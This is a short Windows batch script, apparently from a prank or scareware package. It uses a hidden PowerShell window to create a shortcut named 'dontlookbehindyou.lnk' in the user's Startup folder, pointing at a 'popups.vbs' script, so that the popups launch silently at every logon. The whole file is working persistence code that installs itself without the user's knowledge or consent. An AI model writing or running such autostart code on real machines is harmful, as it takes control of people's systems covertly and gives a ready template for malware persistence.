@echo off


set "TARGET_FILE=sources\popups.vbs"

set "SHORTCUT_NAME=dontlookbehindyou.lnk"

set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT_PATH=%STARTUP_FOLDER%\%SHORTCUT_NAME%"


powershell -WindowStyle Hidden -Command "$TargetFile='%TARGET_FILE%'; $LinkFile='%SHORTCUT_PATH%'; $WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($LinkFile); $Shortcut.TargetPath = $TargetFile; $Shortcut.Save()"
